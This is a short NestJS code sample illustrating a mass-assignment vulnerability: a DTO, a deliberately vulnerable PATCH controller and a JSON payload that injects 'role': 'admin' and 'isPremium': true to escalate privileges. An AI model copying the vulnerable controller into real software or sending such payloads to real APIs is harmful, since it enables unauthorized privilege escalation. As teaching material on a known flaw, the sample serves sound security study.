/*
  NestJS: Mass Aligment and Type Bypass
*/

/*
PayLoad:

{
  "username": "h0ffy",
  "email": "h0ffy@jl4b.net",
  "role": "admin",
  "isPremium": true
}

*/

import { IsString, IsEmail } from 'class-validator';

export class UpdateUserDto {
  @IsString()
  username: string;

  @IsEmail()
  email: string;
}

// Controller vulnerable
@Patch('profile')
async updateProfile(@Body() updateDto: UpdateUserDto) {
  // Vulnerabilidad: Se pasan todas las propiedades de 'body' aunque no estén en el DTO
  // si el ValidationPipe no tiene 'whitelist: true'
  return await this.userService.update(this.currentUser.id, updateDto);
}
